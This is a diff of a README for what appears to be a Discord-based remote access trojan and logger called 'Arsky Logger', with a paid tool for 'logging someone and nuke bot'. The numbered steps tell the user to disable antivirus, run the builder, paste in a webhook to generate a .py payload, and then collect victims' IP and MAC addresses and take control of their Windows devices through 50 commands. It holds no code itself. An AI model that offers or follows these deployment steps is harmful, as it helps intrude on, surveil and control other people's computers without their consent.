@@ -7,9 +7,9 @@ This Logger is the best to the best logger you have many options to use from.
 2) Then make your bot. add the bot to a brand new discord server
 3) after you do all of thoes steps make sure to turn off anti virus ( flase postive and ps: it flags as virus cuz of nuitka with github link of nuitka with it https://nuitka.net/doc/user-manual.html )
 4) then download the file and extract it to the windows.
-5) after run builder file let it install everything you need
-6) Then go to Arsky Priv Paid tool (Note This is a paid tool for logging somone and nuke bot.)
-7) after double click Arsky Tool
+5) after Irun install file and then run builder file after that run start file let it install everything you need
+6) Then go to Arsky Logger
+7) after double click Which Any Tool You Would Like
 8) then go to the server you just made and there should be a new channel name session-1 in the server it would show you who and when and there ip. with there mac adress.
 9) with this tool you will have access to there windwos device. there will be 50 commands on what you can do with it.
 10) going back to the tool you put a webhook into the tool and it will make a file. (the file will be name .py)
